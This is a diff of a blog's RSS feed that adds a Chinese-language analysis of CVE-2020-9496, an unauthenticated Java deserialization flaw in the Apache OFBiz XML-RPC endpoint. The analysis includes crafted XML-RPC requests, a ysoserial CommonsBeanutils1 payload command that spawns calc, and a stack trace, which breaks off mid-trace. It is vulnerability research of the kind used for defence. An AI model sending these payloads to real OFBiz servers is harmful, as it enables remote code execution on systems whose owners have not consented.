@@ -7,8 +7,382 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2020 kylinking</copyright>
-    <lastBuildDate>Wed, 16 Sep 2020 11:48:32 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 22 Sep 2020 11:17:46 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2020-9496 Apache Ofbiz XMLRPC RCE漏洞分析</title>
+      <link>https://kylingit.com/blog/cve-2020-9496-apache-ofbiz-xmlrpc-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Tue, 22 Sep 2020 11:17:46 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2020-9496-apache-ofbiz-xmlrpc-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;下载：&lt;a href=&#34;https://downloads.apache.org/ofbiz/&#34;&gt;https://downloads.apache.org/ofbiz/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;安装：在主目录下执行：
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;.\gradle\init-gradle-wrapper.ps1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gradlew.bat&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+
+&lt;h3 id=&#34;web路由&#34;&gt;Web路由&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!-- framework\webtools\webapp\webtools\WEB-INF\web.xml --&amp;gt;
+&amp;lt;servlet&amp;gt;
+    &amp;lt;description&amp;gt;Main Control Servlet&amp;lt;/description&amp;gt;
+    &amp;lt;display-name&amp;gt;ControlServlet&amp;lt;/display-name&amp;gt;
+    &amp;lt;servlet-name&amp;gt;ControlServlet&amp;lt;/servlet-name&amp;gt;
+    &amp;lt;servlet-class&amp;gt;org.apache.ofbiz.webapp.control.ControlServlet&amp;lt;/servlet-class&amp;gt;
+    &amp;lt;load-on-startup&amp;gt;1&amp;lt;/load-on-startup&amp;gt;
+&amp;lt;/servlet&amp;gt;
+&amp;lt;servlet-mapping&amp;gt;
+    &amp;lt;servlet-name&amp;gt;ControlServlet&amp;lt;/servlet-name&amp;gt;
+    &amp;lt;url-pattern&amp;gt;/control/*&amp;lt;/url-pattern&amp;gt;
+&amp;lt;/servlet-mapping&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据web.xml定义的&lt;code&gt;servlet&lt;/code&gt;，定位到&lt;code&gt;org.apache.ofbiz.webapp.control.ControlServlet&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;主要请求由&lt;code&gt;org.apache.ofbiz.webapp.control.RequestHandler#doRequest()&lt;/code&gt;处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921163908090.png&#34; alt=&#34;image-20200921163908090&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;首先根据请求的url获取路由信息，默认有216个url路径（17.12.03版本）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164034754.png&#34; alt=&#34;image-20200921164034754&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后会根据&lt;code&gt;requestMap.event&lt;/code&gt;信息去查找负责处理event的handler，之后再通过&lt;code&gt;invoke&lt;/code&gt;进行具体的调用，该过程由&lt;code&gt;org.apache.ofbiz.webapp.control.RequestHandler#runEvent()&lt;/code&gt;来完成&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164204132.png&#34; alt=&#34;image-20200921164204132&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164502998.png&#34; alt=&#34;image-20200921164502998&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;xml-rpc消息&#34;&gt;XML-RPC消息&lt;/h3&gt;
+
+&lt;h4 id=&#34;xml-rpc数据类型&#34;&gt;XML-RPC数据类型&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;文档：&lt;a href=&#34;https://ws.apache.org/xmlrpc/types.html&#34;&gt;https://ws.apache.org/xmlrpc/types.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;根据文档，xmlrpc支持多种数据类型，对应的xml标签包括&lt;code&gt;base64&lt;/code&gt;、&lt;code&gt;struct&lt;/code&gt;、&lt;code&gt;array&lt;/code&gt;等&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921165252225.png&#34; alt=&#34;image-20200921165252225&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;下面是几种常见的数据类型&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!-- array --&amp;gt;
+&amp;lt;value&amp;gt;
+  &amp;lt;array&amp;gt;
+    &amp;lt;data&amp;gt;
+      &amp;lt;value&amp;gt;&amp;lt;int&amp;gt;7&amp;lt;/int&amp;gt;&amp;lt;/value&amp;gt;
+    &amp;lt;/data&amp;gt;
+  &amp;lt;/array&amp;gt;
+&amp;lt;/value&amp;gt;
+
+
+&amp;lt;!-- struct --&amp;gt;
+&amp;lt;struct&amp;gt; 
+  &amp;lt;member&amp;gt; 
+    &amp;lt;name&amp;gt;foo&amp;lt;/name&amp;gt; 
+    &amp;lt;value&amp;gt;bar&amp;lt;/value&amp;gt; 
+  &amp;lt;/member&amp;gt; 
+&amp;lt;/struct&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;xml-rpc消息格式&#34;&gt;XML-RPC消息格式&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;文档：&lt;a href=&#34;http://xmlrpc.com/spec.md&#34;&gt;http://xmlrpc.com/spec.md&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;每个XML-RPC请求都以&lt;code&gt;&amp;lt;methodCall&amp;gt;&amp;lt;/methodCall&amp;gt;&lt;/code&gt;开头，该元素包含单个子元素&lt;code&gt;&amp;lt;methodName&amp;gt;method&amp;lt;/methodName&amp;gt;&lt;/code&gt;，元素&lt;code&gt;&amp;lt;methodName&amp;gt;&lt;/code&gt;包含子元素&lt;code&gt;&amp;lt;params&amp;gt;&lt;/code&gt;，&lt;code&gt;&amp;lt;params&amp;gt;&lt;/code&gt;可以包含一个或多个&lt;code&gt;&amp;lt;param&amp;gt;&lt;/code&gt;元素。如：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /RPC2 HTTP/1.0
+User-Agent: Frontier/5.1.2 (WinNT)
+Host: betty.userland.com
+Content-Type: text/xml
+Content-length: 181
+
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;methodCall&amp;gt; 
+  &amp;lt;methodName&amp;gt;examples.getStateName&amp;lt;/methodName&amp;gt;  
+  &amp;lt;params&amp;gt; 
+    &amp;lt;param&amp;gt; 
+      &amp;lt;value&amp;gt;
+        &amp;lt;i4&amp;gt;41&amp;lt;/i4&amp;gt;
+      &amp;lt;/value&amp;gt; 
+    &amp;lt;/param&amp;gt; 
+  &amp;lt;/params&amp;gt; 
+&amp;lt;/methodCall&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
+
+&lt;p&gt;CVE-2020-9496&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;漏洞信息：&lt;a href=&#34;https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz&#34;&gt;https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;补丁：&lt;a href=&#34;https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a&#34;&gt;https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921164745933.png&#34; alt=&#34;image-20200921164745933&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;根据补丁发现&lt;code&gt;framework\webtools\webapp\webtools\WEB-INF\controller.xml&lt;/code&gt;中的&lt;code&gt;xmlrpc&lt;/code&gt;请求增加了&lt;code&gt;&amp;lt;security auth=&amp;quot;true&amp;quot;/&amp;gt;&lt;/code&gt;的认证，说明默认情况下该接口访问无需认证&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;!-- framework\webtools\webapp\webtools\WEB-INF\controller.xml --&amp;gt;
+&amp;lt;request-map uri=&amp;quot;xmlrpc&amp;quot; track-serverhit=&amp;quot;false&amp;quot; track-visit=&amp;quot;false&amp;quot;&amp;gt;
+    &amp;lt;security https=&amp;quot;false&amp;quot;/&amp;gt;
+    &amp;lt;event type=&amp;quot;xmlrpc&amp;quot;/&amp;gt;
+    &amp;lt;response name=&amp;quot;error&amp;quot; type=&amp;quot;none&amp;quot;/&amp;gt;
+    &amp;lt;response name=&amp;quot;success&amp;quot; type=&amp;quot;none&amp;quot;/&amp;gt;
+&amp;lt;/request-map&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;调用方法&#34;&gt;调用方法&lt;/h3&gt;
+
+&lt;p&gt;直接构造post请求发送&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;POST /webtools/control/xmlrpc HTTP/1.1
+Host: 127.0.0.1:8443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/xml
+Content-Length: 181
+
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;methodCall&amp;gt;
+  &amp;lt;methodName&amp;gt;testMethod&amp;lt;/methodName&amp;gt;
+  &amp;lt;params&amp;gt;
+    &amp;lt;param&amp;gt;
+      &amp;lt;value&amp;gt;test&amp;lt;/value&amp;gt;
+    &amp;lt;/param&amp;gt;
+  &amp;lt;/params&amp;gt;
+&amp;lt;/methodCall&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发现报错&lt;code&gt;org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [testMethod]&lt;/code&gt;说明没有相关的方法&lt;/p&gt;
+
+&lt;p&gt;下断点调试一下，由上面的&lt;code&gt;org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke()&lt;/code&gt;进入&lt;code&gt;execute()&lt;/code&gt;，接着调用&lt;code&gt;org.apache.xmlrpc.server.XmlRpcServer#execute()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171252973.png&#34; alt=&#34;image-20200921171252973&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟入&lt;code&gt;XmlRpcServer#execute()&lt;/code&gt;，发现调用了&lt;code&gt;org.apache.xmlrpc.server.XmlRpcServerWorker#execute()&lt;/code&gt;，由具体的event handler处理XML-RPC请求&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171443304.png&#34; alt=&#34;image-20200921171443304&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;org.apache.ofbiz.webapp.event.XmlRpcEventHandler.ServiceRpcHandler#getHandler()&lt;/code&gt;中获取Handler对应的&lt;code&gt;ModelService&lt;/code&gt;，默认注册的service有3000多个，也就是可供调用的&lt;code&gt;methodName&lt;/code&gt;，如果找不到service会抛出&lt;code&gt;No such service&lt;/code&gt;的异常&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921171738522.png&#34; alt=&#34;image-20200921171738522&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以此处传入一个已注册的service&lt;/p&gt;
+
+&lt;p&gt;回到&lt;code&gt;org.apache.xmlrpc.server.XmlRpcServerWorker#execute()&lt;/code&gt;，当成功查询到service后通过&lt;code&gt;handler.execute(pRequest)&lt;/code&gt;进行调用，注意此处还会检查一次&lt;code&gt;ModelService&lt;/code&gt;的&lt;code&gt;export&lt;/code&gt;属性，因此通过遍历serviceMap找到一个&lt;code&gt;export&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;的方法，如&lt;code&gt;ping&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921172937855.png&#34; alt=&#34;image-20200921172937855&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续构造请求（下面会解释为什么需要struct块）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;methodCall&amp;gt;
+  &amp;lt;methodName&amp;gt;ping&amp;lt;/methodName&amp;gt;
+  &amp;lt;params&amp;gt;
+    &amp;lt;param&amp;gt;
+      &amp;lt;value&amp;gt;
+        &amp;lt;struct&amp;gt;
+          &amp;lt;member&amp;gt;
+            &amp;lt;name&amp;gt;foo&amp;lt;/name&amp;gt;
+            &amp;lt;value&amp;gt;aa&amp;lt;/value&amp;gt;
+          &amp;lt;/member&amp;gt;
+        &amp;lt;/struct&amp;gt;
+      &amp;lt;/value&amp;gt;
+    &amp;lt;/param&amp;gt;
+  &amp;lt;/params&amp;gt;
+&amp;lt;/methodCall&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;响应&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&amp;lt;methodResponse xmlns:ex=&amp;quot;http://ws.apache.org/xmlrpc/namespaces/extensions&amp;quot;&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;message&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;PONG&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodResponse&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;说明成功调用ping方法&lt;/p&gt;
+
+&lt;h3 id=&#34;反序列化点&#34;&gt;反序列化点&lt;/h3&gt;
+
+&lt;p&gt;在&lt;code&gt;Ofbiz&lt;/code&gt;自带的第三方库&lt;code&gt;xmlrpc-common-3.1.3.jar&lt;/code&gt;中的&lt;code&gt;org.apache.xmlrpc.parser.SerializableParser&lt;/code&gt;类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921180634383.png&#34; alt=&#34;image-20200921180634383&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;解析xml&#34;&gt;解析XML&lt;/h3&gt;
+
+&lt;p&gt;回到&lt;code&gt;org.apache.ofbiz.webapp.control.RequestHandler#runEvent()&lt;/code&gt;方法，在其随后调用的链中，注意到&lt;code&gt;getRequest()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;org.apache.ofbiz.webapp.control.RequestHandler.runEvent()
+  org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()
+    org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()
+      org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在getRequest()中，传入的xml数据由第三方库&lt;code&gt;xmlrpc-common.jar&lt;/code&gt;来进行解析（注意到此处做了XXE防护）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921174933501.png&#34; alt=&#34;image-20200921174933501&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;该类的初始化由父类&lt;code&gt;org.apache.xmlrpc.parser.RecursiveTypeParserImpl&lt;/code&gt;完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括&lt;code&gt;startElement()&lt;/code&gt;、&lt;code&gt;endElement()&lt;/code&gt;等。我们知道在解析器解析xml数据的过程中，会触发到&lt;code&gt;scanDocument()&lt;/code&gt;操作对元素进行逐一“扫描”，其中就会进行&lt;code&gt;startElement()&lt;/code&gt;、&lt;code&gt;endElement()&lt;/code&gt;的调用，这个过程如果处理不当就会引入问题。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181123956.png&#34; alt=&#34;image-20200921181123956&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意到在&lt;code&gt;endElement()&lt;/code&gt;方法中对于&lt;code&gt;value&lt;/code&gt;标签的处理，同样由父类完成，跟入&lt;code&gt;org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921181252917.png&#34; alt=&#34;image-20200921181252917&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;endValueTag()&lt;/code&gt;调用了&lt;code&gt;getResult()&lt;/code&gt;方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给&lt;code&gt;Ofbiz&lt;/code&gt;，如果&lt;code&gt;value&lt;/code&gt;的标签中存放的值为序列化数据，那么会由&lt;code&gt;SerializableParser&lt;/code&gt;类进行反序列化进而触发漏洞，调用链是这个样子的&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
+  org.apache.xerces.parsers.AbstractSAXParser.parse()
+    org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument()
+      org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement()
+        org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement()
+          org.apache.xmlrpc.parser.MapParser.endElement()
+            org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag()
+              org.apache.xmlrpc.parser.SerializableParser.getResult()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;poc构造&#34;&gt;PoC构造&lt;/h3&gt;
+
+&lt;p&gt;接下来的问题就是如何构造出特定的xml数据&lt;/p&gt;
+
+&lt;p&gt;以上面的ping方法为例，假设post如下数据&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;methodCall&amp;gt;
+  &amp;lt;methodName&amp;gt;ping&amp;lt;/methodName&amp;gt;
+  &amp;lt;params&amp;gt;
+    &amp;lt;param&amp;gt;
+      &amp;lt;value&amp;gt;test&amp;lt;/value&amp;gt;
+    &amp;lt;/param&amp;gt;
+  &amp;lt;/params&amp;gt;
+&amp;lt;/methodCall&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;Ofbiz&lt;/code&gt;成功解析到&lt;code&gt;endValueTag()&lt;/code&gt;方法，但是由于&lt;code&gt;typeParser&lt;/code&gt;属性为空，因此不会进入&lt;code&gt;getResult()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183246986.png&#34; alt=&#34;image-20200921183246986&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么&lt;code&gt;typeParser&lt;/code&gt;属性是在哪里赋值的呢？&lt;/p&gt;
+
+&lt;p&gt;回到&lt;code&gt;org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()&lt;/code&gt;，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的&lt;code&gt;startElement()&lt;/code&gt;进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的&lt;code&gt;startElement&lt;/code&gt;，这个过程是递归的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183456809.png&#34; alt=&#34;image-20200921183456809&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921183856009.png&#34; alt=&#34;image-20200921183856009&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;分析扫描标签的递增过程，发现此处除了4个标签外，还需在&lt;code&gt;&amp;lt;value&amp;gt;&lt;/code&gt;标签中含有额外的标签，才会进入default分支进而对&lt;code&gt;typeParser&lt;/code&gt;赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。&lt;/p&gt;
+
+&lt;p&gt;接着思考如何传入序列化数据，也即如何控制后端通过&lt;code&gt;SerializableParser&lt;/code&gt;解析数据&lt;/p&gt;
+
+&lt;p&gt;还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在&lt;code&gt;org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()&lt;/code&gt;中，注意到&lt;code&gt;factory.getParser()&lt;/code&gt;操作，将由&lt;code&gt;org.apache.xmlrpc.common.TypeFactoryImpl&lt;/code&gt;类获得不同数据类型的解析类，在其中就有获取&lt;code&gt;SerializableParser&lt;/code&gt;的过程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921185008145.png&#34; alt=&#34;image-20200921185008145&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此只要传入&lt;code&gt;&amp;lt;serializable&amp;gt;&lt;/code&gt;标签便会由&lt;code&gt;SerializableParser&lt;/code&gt;进行解析。&lt;/p&gt;
+
+&lt;p&gt;此时还有个前提条件，那就是标签属性必须带有&lt;code&gt;XmlRpcWriter.EXTENSIONS_URI&lt;/code&gt;才会进入后续的判断流程，因此post的数据是这样子的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
+&amp;lt;methodCall&amp;gt;
+  &amp;lt;methodName&amp;gt;ping&amp;lt;/methodName&amp;gt;
+  &amp;lt;params&amp;gt;
+    &amp;lt;param&amp;gt;
+      &amp;lt;value&amp;gt;
+        &amp;lt;struct&amp;gt;
+          &amp;lt;member&amp;gt;
+            &amp;lt;name&amp;gt;foo&amp;lt;/name&amp;gt;
+            &amp;lt;value&amp;gt;
+              &amp;lt;serializable xmlns=&amp;quot;http://ws.apache.org/xmlrpc/namespaces/extensions&amp;quot;&amp;gt;serialized_data&amp;lt;/serializable&amp;gt;
+            &amp;lt;/value&amp;gt;
+          &amp;lt;/member&amp;gt;
+        &amp;lt;/struct&amp;gt;
+      &amp;lt;/value&amp;gt;
+    &amp;lt;/param&amp;gt;
+  &amp;lt;/params&amp;gt;
+&amp;lt;/methodCall&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后一步，数据的格式&lt;/p&gt;
+
+&lt;p&gt;在获取到&lt;code&gt;SerializableParser&lt;/code&gt;解析器后，startElement过程由父类&lt;code&gt;org.apache.xmlrpc.parser.ByteArrayParser#startElement()&lt;/code&gt;完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200922105244816.png&#34; alt=&#34;image-20200922105244816&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;Ofbiz&lt;/code&gt;中存在Commons-Beanutils库，所以使用ysoserial直接生成CommonsBeanutils1的payload&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;gt; java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc | base64 |tr -d &amp;quot;\n&amp;quot;
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;填充serialized_data并发送&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200921191012365.png&#34; alt=&#34;image-20200921191012365&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;调用链&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
+	at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3]
+	at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141]
+	at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141]
+	at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141]
+	at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141]
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141]
+	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141]
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141]
+	at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141]
+	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141]
+	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141]
+	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141]
+	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141]
+	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141]
+	at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3]
+	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3]
+	at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3]
+	at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3]
+	at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3]
+	at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
